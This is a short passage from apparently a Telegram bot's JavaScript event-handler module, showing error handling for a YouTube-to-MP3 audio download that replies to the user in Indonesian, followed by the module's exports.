      console.error("❌ YTMP3 API Error:", err);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ᴀᴜᴅɪᴏ!</b>\n\nᴋᴇᴍᴜɴɢᴋɪɴᴀɴ ᴀᴘɪ ᴋᴇʏ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ ᴀᴛᴀᴜ sᴇʀᴠᴇʀ sɪʙᴜᴋ.</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });
    }
  })();
  return;
}
       
        } catch (error) {
            console.error(`Handler error ${userId}:`, error.message);
        }
    }, new NewMessage({}));

    console.log(`✅ Event handlers: ${userId}`);
}

module.exports = { setupEventHandlers, getUserState, userStates };
